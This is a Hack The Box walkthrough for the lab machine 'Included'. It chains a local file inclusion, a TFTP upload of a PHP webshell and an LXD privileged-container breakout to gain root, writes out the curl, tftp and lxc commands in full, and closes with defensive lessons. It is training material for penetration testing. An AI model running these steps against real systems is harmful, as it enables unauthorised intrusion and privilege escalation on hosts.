---
title: "Included — Hack The Box Walkthrough"
description: "Chaining LFI, TFTP file upload, and LXD breakout to root Included."
date: 2026-09-02
category: offensive
readTime: "5 min read"
mitre:
  - "T1190"
  - "T1068"
tags:
  - "Hack The Box"
  - "LFI"
  - "TFTP"
  - "LXD"
  - "Container"
  - "Linux"
  - "CTF"
summary: "Chaining LFI, TFTP file upload, and LXD breakout to root Included."
---

**Machine:** Included
**Difficulty:** Very Easy
**Key Techniques:** LFI, TFTP upload, webshell, LXD container breakout

---

## Enumeration

### Port Scanning

```
80/tcp  http  (redirects to /index.php?file=home.php)
```

The web app has a **Local File Inclusion (LFI)** via the `file` parameter.

---

## Exploitation

### Confirm LFI

```bash
curl "http://10.129.95.185/index.php?file=/etc/passwd"
```

Arbitrary file read confirms LFI.

### TFTP Upload

A **TFTP** service allows uploading to the web root:

```bash
tftp 10.129.95.185
put shell.php
```

### LFI → RCE

Include the uploaded PHP webshell:

```bash
curl "http://10.129.95.185/index.php?file=shell.php&cmd=id"
```

Shell as `www-data` in a container.

```
user.txt: <flag>
```

---

## Privilege Escalation — LXD Breakout

The user is in the **LXD** group, which can create privileged containers mounting the host filesystem:

```bash
lxc image import alpine.tar.gz --alias alpine
lxc init alpine c -c security.privileged=true
lxc config device add c host disk source=/ path=/mnt/root recursive=true
lxc start c
lxc exec c /bin/sh
```

Access the host FS and read the root flag:

```
root.txt: <flag>
```

---

## Lessons Learned

1. **LFI is critical** — sanitize file parameters and avoid user-controlled include paths.
2. **Disable TFTP on production web servers**.
3. **LXD/LXC group membership is effectively root** — it lets you create privileged containers exposing the host filesystem.
4. **Segment containers** so web containers lack host FS access.
